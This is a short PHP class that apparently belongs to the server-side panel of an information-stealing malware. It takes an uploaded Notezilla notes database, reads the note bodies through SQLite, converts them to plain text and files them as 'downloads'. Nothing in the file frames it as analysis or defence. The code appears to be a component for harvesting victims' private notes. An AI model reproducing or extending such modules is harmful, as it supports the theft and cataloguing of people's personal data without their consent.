<?php
//ok
class Module_notezilla extends Module_
{
    private function processnote($Data)
    {
        $FileDB = GetTempFile('notezilla');
        if(!file_put_contents($FileDB, $Data))
            return FALSE;

        $db = new SQLite3($FileDB);
        if(!$db)
            return FALSE;

        $Datax = $db->query('SELECT BodyRich  FROM Notes');

		$Result = '';
        while($Element = $Datax->fetchArray())
        {
			$Data__ = rtf2text($Element['BodyRich']);
			if(strlen($Data__))
			{
				
				$Result .= $Data__;
				$Result .= str_pad("", 30, "-") . "\r\n";
			}
        }
		
		$this->insert_downloads(substr($Result, 0, 20) . ".txt", $Result);
		
        $db->close();
		$db = $Datax = $Result = NULL;
        @unlink($FileDB);
    }

    public function process_module($Data, $Version)
    {
		if(!class_exists("SQLite3"))
			return;
		
        switch ($Version)
        {
        case 0:
            $this->processnote($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
